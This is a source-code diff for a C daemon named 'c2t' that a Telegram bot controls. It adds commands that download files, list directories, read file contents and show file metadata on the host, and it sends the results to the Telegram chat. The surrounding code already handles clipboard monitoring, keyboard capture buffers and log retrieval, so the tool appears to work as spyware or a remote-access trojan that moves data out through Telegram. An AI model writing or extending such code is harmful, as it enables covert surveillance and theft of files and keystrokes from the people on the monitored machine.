@@ -22,6 +22,7 @@
 #include "../keyboard/keyboard_output.h"
 #include "../logging/logging.h"
 #include "../logging/log_sender.h"
+#include "../files/files.h"
 #include "telegram.h"
 #include "telegram_platform.h"
 
@@ -224,6 +225,70 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  "• <code>/keyboard_status</code> - View keyboard monitor state &amp; buffer status\n\n"
                  "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-list</code>)</i>");
         telegram_send_html(kb_help);
+    } else if (match_command(text, "getfile") || match_command(text, "file") ||
+               match_command(text, "download") || match_command(text, "fetch") ||
+               match_command(text, "get")) {
+        const char *arg = get_command_argument(text);
+        if (!arg || !*arg) {
+            telegram_send_html("⚠️ <b>Usage:</b> <code>/getfile &lt;file_path&gt;</code>\n"
+                               "<i>Example:</i> <code>/getfile /etc/hosts</code> or <code>/getfile \"C:\\path\\file.txt\"</code>\n"
+                               "<i>Use <code>/ls</code> to explore directories.</i>");
+        } else {
+            c2t_log_info("listener", "Retrieving file '%s' on-demand by Telegram command", arg);
+            (void)c2t_file_send_path(arg, nullptr);
+        }
+    } else if (match_command(text, "ls") || match_command(text, "dir") || match_command(text, "list")) {
+        const char *arg = get_command_argument(text);
+        char list_resp[3800];
+        c2t_log_info("listener", "Listing directory '%s' on-demand by Telegram command", (arg && *arg) ? arg : ".");
+        if (c2t_file_list_directory(arg, list_resp, sizeof(list_resp))) {
+            telegram_send_html(list_resp);
+        } else {
+            if (list_resp[0]) {
+                telegram_send_html(list_resp);
+            } else {
+                telegram_send_html("⚠️ <i>Unable to list directory.</i>");
+            }
+        }
+    } else if (match_command(text, "cat") || match_command(text, "view") ||
+               match_command(text, "read") || match_command(text, "preview")) {
+        const char *arg = get_command_argument(text);
+        if (!arg || !*arg) {
+            telegram_send_html("⚠️ <b>Usage:</b> <code>/cat &lt;file_path&gt;</code>\n"
+                               "<i>Example:</i> <code>/cat /etc/os-release</code>\n"
+                               "<i>Use <code>/getfile</code> for full download or binary files.</i>");
+        } else {
+            char preview_resp[3800];
+            c2t_log_info("listener", "Reading text preview for '%s' on-demand by Telegram command", arg);
+            if (c2t_file_read_text_preview(arg, preview_resp, sizeof(preview_resp), 3000)) {
+                telegram_send_html(preview_resp);
+            } else {
+                if (preview_resp[0]) {
+                    telegram_send_html(preview_resp);
+                } else {
+                    telegram_send_html("⚠️ <i>Unable to read file preview.</i>");
+                }
+            }
+        }
+    } else if (match_command(text, "fileinfo") || match_command(text, "file_info") ||
+               match_command(text, "stat")) {
+        const char *arg = get_command_argument(text);
+        if (!arg || !*arg) {
+            telegram_send_html("⚠️ <b>Usage:</b> <code>/fileinfo &lt;path&gt;</code>\n"
+                               "<i>Example:</i> <code>/fileinfo /etc/hosts</code>");
+        } else {
+            char info_resp[1024];
+            c2t_log_info("listener", "Querying file info for '%s' on-demand by Telegram command", arg);
+            if (c2t_file_get_info(arg, info_resp, sizeof(info_resp))) {
+                telegram_send_html(info_resp);
+            } else {
+                if (info_resp[0]) {
+                    telegram_send_html(info_resp);
+                } else {
+                    telegram_send_html("⚠️ <i>Unable to retrieve file info.</i>");
+                }
+            }
+        }
     } else if (match_command(text, "mute_clipboard") || match_command(text, "pause_clipboard")) {
         clipboard_set_paused(1);
         c2t_log_info("listener", "Clipboard monitoring paused by Telegram command");
@@ -267,7 +332,7 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  (unsigned long long)config->queue_max_bytes);
         telegram_send_html(status_msg);
     } else if (match_command(text, "help") || match_command(text, "start")) {
-        char help_msg[1280];
+        char help_msg[1500];
         snprintf(help_msg, sizeof(help_msg),
                  "💡 <b>c2t Telegram Commands</b>\n\n"
                  "<b>Core Controls:</b>\n"
@@ -276,6 +341,11 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  "• <code>/toggle</code> - Toggle pause / resume\n"
                  "• <code>/logs</code> - Flush and retrieve execution logs\n"
                  "• <code>/status</code> - View daemon status &amp; monitoring state\n\n"
+                 "<b>File Management:</b>\n"
+                 "• <code>/getfile &lt;path&gt;</code> - Retrieve &amp; send file from host\n"
+                 "• <code>/ls [path]</code> - List directory contents\n"
+                 "• <code>/cat &lt;path&gt;</code> - View text file contents\n"
+                 "• <code>/fileinfo &lt;path&gt;</code> - View file or directory metadata\n\n"
                  "<b>Keyboard Controls:</b>\n"
                  "• <code>/keyboard_list</code> - View detected keyboard devices\n"
                  "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active keyboard target\n"
